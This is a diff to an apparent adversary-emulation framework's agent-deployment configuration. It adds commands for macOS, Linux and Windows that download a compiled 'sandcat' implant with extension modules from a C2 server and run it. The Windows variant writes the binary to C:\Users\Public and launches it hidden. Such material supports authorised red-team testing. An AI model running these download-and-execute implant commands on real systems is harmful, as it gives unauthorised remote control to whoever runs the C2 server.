@@ -26,6 +26,12 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
+          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
@@ -56,6 +62,12 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
+          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -group red -v
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
@@ -90,6 +102,20 @@
               $wc=New-Object System.Net.WebClient;
               $wc.Headers.add("platform","windows");
               $wc.Headers.add("file","sandcat.go");
+              $data=$wc.DownloadData($url);
+              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\$name.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+          - description: Compile agent with a comma-separated list of extension modules (requires GoLang to be installed on the C2 server machine).
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions", "#{agent.extensions}");
               $data=$wc.DownloadData($url);
               $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
               get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
